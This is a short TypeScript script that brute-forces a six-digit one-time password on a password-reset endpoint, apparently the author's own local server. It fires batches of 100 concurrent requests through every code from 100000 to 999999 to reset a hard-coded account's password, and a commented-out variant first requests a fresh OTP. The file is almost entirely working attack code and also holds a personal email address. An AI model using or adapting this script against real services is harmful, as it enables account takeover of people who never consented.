import axios from "axios";

async function performRequest(otp: number): Promise<object> {
    try {
        const res = await axios.post("http://localhost:3333/reset-password", {
            email: "shoyebff45@gmail.com",
            newPassword: "new",
            otp: otp
        });
        return res.data;
    } catch (err: any) {
        return { error: err?.response?.data || err.message };
    }
}

// async function generateOtp(idx: number, num: number): Promise<void> {
//     if (idx > 6) {
//         const data = await performRequest(num);
//         console.log(`Tried OTP ${num}:`, data);
//         return;
//     }

//     for (let i = 1; i < 10; i++) {
//         await generateOtp(idx + 1, num * 10 + i);
//     }
// }

// (async () => {
//     try {
//         await axios.post(
//             "http://localhost:3333/generate-otp",
//             { email: "shoyebff45@gmail.com" },
//             {
//                 headers: {
//                     "Content-Type": "application/json"
//                 }
//             }
//         );
//         console.log("OTP generated successfully. Now trying to crack it...");
//         await generateOtp(1, 0);
//     } catch (err) {
//         console.error("Failed to generate OTP:", err);
//     }
// })();

async function main() {
    for (let i = 100000; i <= 999999; i += 100) {
        let p = [];
    
        for (let j = 0; j < 100; j++) {
            console.log(i + j);
            
            p.push(performRequest(i + j));
        }
        
        await Promise.all(p)
    }

}

main()